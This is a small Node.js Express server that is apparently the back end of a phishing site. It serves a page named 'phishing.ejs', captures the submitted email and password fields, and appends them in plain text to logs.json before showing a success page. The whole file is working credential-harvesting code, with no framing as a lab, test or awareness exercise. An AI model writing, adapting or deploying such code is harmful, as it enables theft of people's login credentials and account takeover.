var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", function (req, res) {
    res.render("phishing.ejs");
});

app.post("/", function (req, res) {
    var username = req.body.usermail;
    var password = req.body.userpass;
    var data = `${username} -> ${password}\n`;
    fs.appendFile('logs.json', data, function (err) {
        if (err) {
            console.log(err);
        }
    });
    res.render("success.ejs");
});

app.listen(3000, function () {
    console.log("Server listening on port 3000");
});
